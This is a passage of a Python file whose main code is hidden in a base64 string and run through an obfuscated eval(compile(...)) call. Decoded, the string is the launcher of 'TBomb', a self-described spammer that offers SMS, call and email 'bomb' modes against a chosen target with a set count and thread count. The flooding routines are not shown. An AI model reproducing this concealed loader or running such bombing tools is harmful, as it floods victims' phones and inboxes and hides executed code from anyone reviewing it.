ZXB0aW9uOgogICAgICAgICAgICAgICAgbWVzZ2RjcnQuRmFpbHVyZU1lc3NhZ2UoIlJlYWQgSW5zdHJ1Y3Rpb25zIENhcmVmdWxseSAhISEiKQogICAgICAgICAgICAgICAgcHJpbnQoKQoKICAgICAgICB3b3JrZXJub2RlKG1vZGUsIGNjLCB0YXJnZXQsIGNvdW50LCBkZWxheSwgbWF4X3RocmVhZHMpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgbWVzZ2RjcnQuV2FybmluZ01lc3NhZ2UoIlJlY2VpdmVkIElOVFIgY2FsbCAtIEV4aXRpbmcuLi4iKQogICAgICAgIHN5cy5leGl0KCkKCgptZXNnZGNydCA9IE1lc3NhZ2VEZWNvcmF0b3IoImljb24iKQppZiBzeXMudmVyc2lvbl9pbmZvWzBdICE9IDM6CiAgICBtZXNnZGNydC5GYWlsdXJlTWVzc2FnZSgiVEJvbWIgd2lsbCB3b3JrIG9ubHkgaW4gUHl0aG9uIHYzIikKICAgIHN5cy5leGl0KCkKCnRyeToKICAgIGNvdW50cnlfY29kZXMgPSByZWFkaXNkYygpWyJpc2Rjb2RlcyJdCmV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgIHVwZGF0ZSgpCgoKX19WRVJTSU9OX18gPSBnZXRfdmVyc2lvbigpCl9fQ09OVFJJQlVUT1JTX18gPSBbJ1NwZWVkWCcsICdIYWNrZXJTTTknXQoKQUxMX0NPTE9SUyA9IFtGb3JlLkdSRUVOLCBGb3JlLlJFRCwgRm9yZS5ZRUxMT1csIEZvcmUuQkxVRSwKICAgICAgICAgICAgICBGb3JlLk1BR0VOVEEsIEZvcmUuQ1lBTiwgRm9yZS5XSElURV0KUkVTRVRfQUxMID0gU3R5bGUuUkVTRVRfQUxMCgpBU0NJSV9NT0RFID0gRmFsc2UKREVCVUdfTU9ERSA9IEZhbHNlCgpkZXNjcmlwdGlvbiA9ICIiIlRCb21iIC0gWW91ciBGcmllbmRseSBTcGFtbWVyIEFwcGxpY2F0aW9uCgpUQm9tYiBjYW4gYmUgdXNlZCBmb3IgbWFueSBwdXJwb3NlcyB3aGljaCBpbmN1ZGVzIC0KXHQgRXhwb3NpbmcgdGhlIHZ1bG5lcmFibGUgQVBJcyBvdmVyIEludGVybmV0Clx0IEZyaWVuZGx5IFNwYW1taW5nClx0IFRlc3RpbmcgWW91ciBTcGFtIERldGVjdG9yIGFuZCBtb3JlIC4uLi4KClRCb21iIGlzIG5vdCBpbnRlbnRlZCBmb3IgbWFsaWNpb3VzIHVzZXMuCiIiIgoKcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249ZGVzY3JpcHRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVwaWxvZz0nQ29kZWQgYnkgU3BlZWRYICEhIScpCnBhcnNlci5hZGRfYXJndW1lbnQoIi1zbXMiLCAiLS1zbXMiLCBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgICAgICAgICAgICAgIGhlbHA9InN0YXJ0IFRCb21iIHdpdGggU01TIEJvbWIgbW9kZSIpCnBhcnNlci5hZGRfYXJndW1lbnQoIi1jYWxsIiwgIi0tY2FsbCIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAgaGVscD0ic3RhcnQgVEJvbWIgd2l0aCBDQUxMIEJvbWIgbW9kZSIpCnBhcnNlci5hZGRfYXJndW1lbnQoIi1tYWlsIiwgIi0tbWFpbCIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAgaGVscD0ic3RhcnQgVEJvbWIgd2l0aCBNQUlMIEJvbWIgbW9kZSIpCnBhcnNlci5hZGRfYXJndW1lbnQoIi1hc2NpaSIsICItLWFzY2lpIiwgYWN0aW9uPSJzdG9yZV90cnVlIiwKICAgICAgICAgICAgICAgICAgICBoZWxwPSJzaG93IG9ubHkgY2hhcmFjdGVycyBvZiBzdGFuZGFyZCBBU0NJSSBzZXQiKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCItdSIsICItLXVwZGF0ZSIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAgaGVscD0idXBkYXRlIFRCb21iIikKcGFyc2VyLmFkZF9hcmd1bWVudCgiLWMiLCAiLS1jb250cmlidXRvcnMiLCBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgICAgICAgICAgICAgIGhlbHA9InNob3cgY3VycmVudCBUQm9tYiBjb250cmlidXRvcnMiKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCItdiIsICItLXZlcnNpb24iLCBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgICAgICAgICAgICAgIGhlbHA9InNob3cgY3VycmVudCBUQm9tYiB2ZXJzaW9uIikKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKICAgIGlmIGFyZ3MuYXNjaWk6CiAgICAgICAgQVNDSUlfTU9ERSA9IFRydWUKICAgICAgICBtZXNnZGNydCA9IE1lc3NhZ2VEZWNvcmF0b3IoInN0YXQiKQogICAgaWYgYXJncy52ZXJzaW9uOgogICAgICAgIHByaW50KCJWZXJzaW9uOiAiLCBfX1ZFUlNJT05fXykKICAgIGVsaWYgYXJncy5jb250cmlidXRvcnM6CiAgICAgICAgcHJpbnQoIkNvbnRyaWJ1dG9yczogIiwgIiAiLmpvaW4oX19DT05UUklCVVRPUlNfXykpCiAgICBlbGlmIGFyZ3MudXBkYXRlOgogICAgICAgIHVwZGF0ZSgpCiAgICBlbGlmIGFyZ3MubWFpbDoKICAgICAgICBzZWxlY3Rub2RlKG1vZGU9Im1haWwiKQogICAgZWxpZiBhcmdzLmNhbGw6CiAgICAgICAgc2VsZWN0bm9kZShtb2RlPSJjYWxsIikKICAgIGVsaWYgYXJncy5zbXM6CiAgICAgICAgc2VsZWN0bm9kZShtb2RlPSJzbXMiKQogICAgZWxzZToKICAgICAgICBjaG9pY2UgPSAiIgogICAgICAgIGF2YWlsX2Nob2ljZSA9IHsKICAgICAgICAgICAgIjEiOiAiU01TIiwKICAgICAgICAgICAgIjIiOiAiQ0FMTCIsCiAgICAgICAgICAgICIzIjogIk1BSUwiCiAgICAgICAgfQogICAgICAgIHRyeToKICAgICAgICAgICAgd2hpbGUgKGNob2ljZSBub3QgaW4gYXZhaWxfY2hvaWNlKToKICAgICAgICAgICAgICAgIGNscigpCiAgICAgICAgICAgICAgICBiYW5uX3RleHQoKQogICAgICAgICAgICAgICAgcHJpbnQoIkF2YWlsYWJsZSBPcHRpb25zOlxuIikKICAgICAgICAgICAgICAgIGZvciBrZXksIHZhbHVlIGluIGF2YWlsX2Nob2ljZS5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbIHtrZXl9IF0ge3ZhbHVlfSBCT01CIi5mb3JtYXQoa2V5PWtleSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPXZhbHVlKSkKICAgICAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgICAgIGNob2ljZSA9IGlucHV0KG1lc2dkY3J0LkNvbW1hbmRNZXNzYWdlKCJFbnRlciBDaG9pY2UgOiAiKSkKICAgICAgICAgICAgc2VsZWN0bm9kZShtb2RlPWF2YWlsX2Nob2ljZVtjaG9pY2VdLmxvd2VyKCkpCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICBtZXNnZGNydC5XYXJuaW5nTWVzc2FnZSgiUmVjZWl2ZWQgSU5UUiBjYWxsIC0gRXhpdGluZy4uLiIpCiAgICAgICAgICAgIHN5cy5leGl0KCkKICAgIHN5cy5leGl0KCk="
magic = eval(compile(base64.b64decode(eval('\x6d\x61\x69\x6e')),'\x3c\x73\x74\x72\x69\x6e\x67\x3e','\x65\x78\x65\x63'))
